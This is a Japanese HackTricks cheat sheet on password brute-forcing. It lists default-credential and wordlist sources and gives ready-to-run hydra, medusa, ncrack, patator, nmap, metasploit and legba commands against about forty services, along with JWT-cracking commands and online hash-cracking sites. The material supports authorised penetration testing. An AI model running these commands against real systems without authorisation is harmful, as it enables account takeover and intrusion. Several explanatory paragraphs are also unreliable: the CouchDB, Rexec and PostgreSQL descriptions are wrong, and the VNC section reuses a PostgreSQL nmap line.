# Brute Force - CheatSheet

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* 独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションである[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見
* \*\*💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>

## デフォルトの資格情報

使用されている技術のデフォルトの資格情報を検索するか、次のリンクを試してみてください：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **独自の辞書を作成する**

ターゲットに関する情報をできるだけ多く見つけ、カスタム辞書を生成します。役立つツール：

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Cewl

Cewlは、Webサイトから単語リストを生成するためのツールです。通常、Cewlは、Webサイトのテキストから単語を抽出し、それらをリスト化します。これにより、後でブルートフォース攻撃やパスワードスプレー攻撃で使用するための単語リストを作成できます。

```bash
cewl example.com -m 5 -w words.txt
```

### [CUPP](https://github.com/Mebus/cupp)

被害者の情報（名前、日付など）に基づいてパスワードを生成します。

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

特定のターゲットに関して使用するための一意で理想的なワードリストを作成するために、与えられた単語から複数のバリエーションを作成することができるツールであるワードリストジェネレーターツール。

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### ワードリスト

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## サービス

サービス名のアルファベット順に並べ替えられています。

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

AJP（Apache JServ Protocol）は、Apache Tomcatサーバーと連携するためのプロトコルです。AJPを使用してTomcatサーバーに対してBrute Force攻撃を行うことができます。Brute Force攻撃は、総当たり攻撃とも呼ばれ、自動化されたツールを使用して、パスワードや認証情報を破るために大量の試行を行う攻撃手法です。Brute Force攻撃は、セキュリティ上の脆弱性を突くための一般的な手法の1つです。

```bash
nmap --script ajp-brute -p 8009 <IP>
```

## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

## AMQP（ActiveMQ、RabbitMQ、Qpid、JORAM、Solace）

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### カサンドラ

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### CouchDB

CouchDBは、データベースに対するブルートフォース攻撃を防ぐために、`max_document_size`と`max_attachment_size`の設定を使用します。これらの設定を適切に構成することで、大量のデータを一度に送信する攻撃を防ぐことができます。

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

### Docker レジストリ

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

FTP（File Transfer Protocol）は、ファイルをサーバーに転送するためのプロトコルです。FTPサーバーへのアクセスをブルートフォース攻撃で試みることができます。一般的なツールにはHydraやMedusaがあります。

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTPジェネリックブルート

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTPベーシック認証

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

NTLM認証は、Windowsベースのシステムで一般的に使用される認証プロトコルです。NTLM認証をバイパスするために、Brute Force攻撃を使用することができます。Brute Force攻撃は、すべての可能なパスワードの組み合わせを試行し、正しい組み合わせを見つけることで認証を回避する手法です。NTLM認証に対するBrute Force攻撃は、一般的なツールやスクリプトを使用して実行することができます。

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - ポストフォーム

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle

**https**にするには、"http-post-form"から"\*\*https-post-form"\*\*に変更する必要があります

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

IMAP stands for Internet Message Access Protocol. It is a protocol used to retrieve emails from a mail server. IMAP servers are often targeted for brute force attacks to gain unauthorized access to email accounts.

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

IRC（Internet Relay Chat）は、オープンソースのチャットプロトコルであり、テキストベースのコミュニケーションを可能にします。IRCサーバーに対してブルートフォース攻撃を行うことで、ユーザー名やパスワードを推測することができます。

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

iSCSI (Internet Small Computer System Interface) is a protocol that allows SCSI commands to be sent over a network. It is commonly used to enable communication between storage devices over an IP network.

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

JWT（JSON Web Token）は、認証や情報の交換に使用されるコンパクトで自己完結型の方法です。JWTは、ヘッダー、ペイロード、および署名から構成されています。JWTの署名を検証するために、Brute Force攻撃が使用されることがあります。Brute Force攻撃は、すべての可能な組み合わせを試行し、正しい署名を見つけることを目的としています。

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

LDAP（Lightweight Directory Access Protocol）は、ディレクトリサービスにアクセスするためのプロトコルです。LDAPサーバーに対してBrute Force攻撃を行うことで、有効なユーザー名やパスワードを特定することができます。

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

MQTT（Message Queuing Telemetry Transport）は、軽量なメッセージ通信プロトコルであり、IoTデバイス間の通信に広く使用されています。 MQTTブローカーに対するBrute Force攻撃は、一般的なユーザー名とパスワードの組み合わせを継続的に試行することで、不正アクセスを試みる攻撃手法です。これに対抗するためには、強力なパスワードポリシーを実装し、アカウントロックアウト機能を有効にすることが重要です。

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

MongoDBは、デフォルトでブルートフォース攻撃に対して脆弱です。MongoDBは、デフォルトでネットワーク上のすべてのインターフェースからの接続を受け入れるように設定されているため、攻撃者がアクセスを試みることができます。これに対処するためには、適切なアクセス制御と認証を実装することが重要です。

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

MSSQL（Microsoft SQL Server）は、Windows環境で広く使用されているリレーショナルデータベース管理システム（RDBMS）です。MSSQLへのBrute Force攻撃は、一般的なユーザー名とパスワードの組み合わせを使用して、MSSQLサーバーに不正アクセスを試みる方法です。Brute Force攻撃は、自動化ツールを使用して大量の認証試行を行うことで、サーバーへのアクセスを獲得しようとします。MSSQLのBrute Force攻撃を防ぐためには、強力なパスワードポリシーの実装やアカウントロックアウトの設定などのセキュリティ対策が重要です。

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

MySQLは、多くのWebアプリケーションで使用される人気のあるデータベース管理システムです。MySQLデータベースへの不正アクセスを試みる際には、Brute Force攻撃が有効な手法となります。Brute Force攻撃は、辞書攻撃やランダムなパスワードの組み合わせを使用して、MySQLデータベースにログインするための正しいパスワードを見つけることを試みるものです。Brute Force攻撃は、パスワードが複雑でない場合やセキュリティ対策が不十分な場合に特に有効です。

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

Brute-force attacks against Oracle databases can be performed using tools like Hydra or custom scripts. These attacks involve trying multiple username and password combinations until the correct one is found. It is important to note that brute-force attacks can be time-consuming and may trigger account lockouts or alarms on the target system.

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

**oracle\_login**を**patator**と一緒に使用するには、以下を**インストール**する必要があります：

```bash
pip3 install cx_Oracle --upgrade
```

[オフラインOracleSQLハッシュブルートフォース](https://github.com/carlospolop/hacktricks/blob/jp/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force)（**バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**、および**11.2.0.3**）:

```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

### POP

POP（Post Office Protocol）は、電子メールを受信するために使用されるプロトコルです。通常、POPサーバーに接続してメールボックス内のメッセージをダウンロードする際に使用されます。

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

PostgreSQLは、データベースへのアクセスを破るためのBrute Force攻撃に対して非常に耐性があります。しかし、以下の方法でBrute Force攻撃を防ぐことができます。

1. **強力なパスワードポリシーの実装** - パスワードの長さ、複雑さ、および定期的な変更を要求するポリシーを設定します。
2. **アカウントロックアウトの有効化** - 一定回数の誤った認証試行後にアカウントをロックするように設定します。
3. **IP制限** - 特定のIPアドレスからのアクセスのみを許可するように設定します。
4. **二要素認証** - ユーザーが追加の認証手段を必要とするように設定します。

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)からインストール用の`.deb`パッケージをダウンロードできます。

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

Redisは、デフォルトでパスワードを持たないことがよくあります。そのため、Brute Force攻撃は、一般的なユーザー名とパスワードの組み合わせを使用して、Redisサーバーにアクセスを試みる方法として有効です。Brute Force攻撃は、自動化されたスクリプトを使用して、大量のユーザー名とパスワードの組み合わせを試すことで実行されます。これにより、攻撃者は正しい認証情報を見つける可能性が高まります。Brute Force攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウト機能を有効にすることが重要です。

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

### Rexec

Rexecは、リモートシステムに対してBrute Force攻撃を行うためのツールです。このツールは、ユーザー名とパスワードの組み合わせを総当たりで試行し、システムにアクセスするための正しい認証情報を見つけることを目的としています。Rexecを使用する際には、アカウントロックアウトやログの監視などのセキュリティ対策が重要です。

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Rloginは、ユーザー名とパスワードの組み合わせを総当たりで試すために使用されることがあります。Brute force攻撃を行う際には、ユーザー名とパスワードのリストを使用して、Rloginサービスに対して自動的にログイン試行を行います。

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Rsh（リモートシェル）は、ユーザーがリモートホスト上でコマンドを実行できるようにするためのプロトコルです。Brute force攻撃に対して脆弱であるため、Rshはセキュリティ上のリスクを伴います。

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

RTSP（Real Time Streaming Protocol）は、リアルタイムのデータ配信を行うためのネットワーク制御プロトコルです。

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

SFTP（SSH File Transfer Protocol）は、SSHプロトコルを使用してファイルを安全に転送するためのプロトコルです。

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

SNMP（Simple Network Management Protocol）は、ネットワークデバイスの監視や管理に使用されるプロトコルです。 SNMPのバージョン1と2は、コミュニティストリングを使用して認証を行います。これは、辞書攻撃やブルートフォース攻撃に対して脆弱です。

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

SMB（Server Message Block）は、Windowsベースのシステムで使用されるネットワークプロトコルです。SMBをブルートフォース攻撃することで、パスワードを推測してシステムにアクセスすることが可能です。BruteForcerやHydraなどのツールを使用して、SMBサーバーに対してユーザー名とパスワードの組み合わせを総当たりで試行することが一般的です。

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMTP

SMTP（Simple Mail Transfer Protocol）は、電子メールを送信するための標準プロトコルです。通常、25番ポートを使用します。Brute force攻撃は、SMTPサーバーに対して一連のパスワードを試すことでアカウントにアクセスしようとする攻撃手法の1つです。

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

SOCKSは、ネットワークプロトコルであり、通常、TCP接続を介してネットワークを中継するために使用されます。SOCKSプロトコルは、プロキシサーバーを介して通信を中継するために使用され、ユーザーのIPアドレスを隠すために使用されることがあります。Brute-force攻撃において、SOCKSプロキシを使用して攻撃を匿名化することができます。

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

SQL Serverは、Microsoftが開発したリレーショナルデータベース管理システムです。SQL ServerへのBrute Force攻撃は、一般的にユーザー名とパスワードの組み合わせを総当たりで試行することによって行われます。攻撃者は、自動化ツールを使用して大量の認証試行を行い、正しい認証情報を見つけようとします。SQL ServerへのBrute Force攻撃は、適切なセキュリティ対策が講じられていない場合に特に危険です。

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

SSH（Secure Shell）は、ネットワーク経由で安全に通信するためのプロトコルです。SSHブルートフォース攻撃は、辞書攻撃や総当たり攻撃を使用してSSHサーバーに不正アクセスを試みる手法です。SSHブルートフォース攻撃は、弱いパスワードを持つユーザーアカウントを狙うことが一般的です。SSHサーバーのセキュリティを向上させるためには、強力なパスワードポリシーを実装し、公開鍵認証を使用することが重要です。

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### 弱いSSHキー / Debian予測可能なPRNG

一部のシステムには、暗号資料を生成する際に使用されるランダムシードに既知の欠陥があります。これにより、劇的に減少したキースペースが生じ、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)などのツールでブルートフォース攻撃される可能性があります。[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)などの事前生成された弱いキーのセットも利用可能です。

### STOMP (ActiveMQ、RabbitMQ、HornetQ、およびOpenMQ)

STOMPテキストプロトコルは、RabbitMQ、ActiveMQ、HornetQ、およびOpenMQなどの人気のあるメッセージキューイングサービスとのシームレスなコミュニケーションとやり取りを可能にする広く使用されているメッセージングプロトコルです。これは、メッセージの交換やさまざまなメッセージング操作を効率的かつ標準化された方法で実行するための手段を提供します。

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

Telnetは、ネットワーク上の別のコンピューターにリモートでアクセスするためのプロトコルです。一般的なBrute Force攻撃は、Telnetサーバーに対してユーザー名とパスワードの組み合わせを継続的に試行することで行われます。

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

#### Brute Force

Brute force attacks against VNC servers are common due to the protocol's lack of built-in security features. Tools like Hydra and Medusa can be used to automate the process of trying different username and password combinations until the correct one is found. It is important to use strong, complex passwords and consider implementing additional security measures such as IP whitelisting or VPNs to protect VNC servers from brute force attacks.

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって強化された**ワークフロー**を簡単に構築し、**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ローカル

### オンラインクラッキングデータベース

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
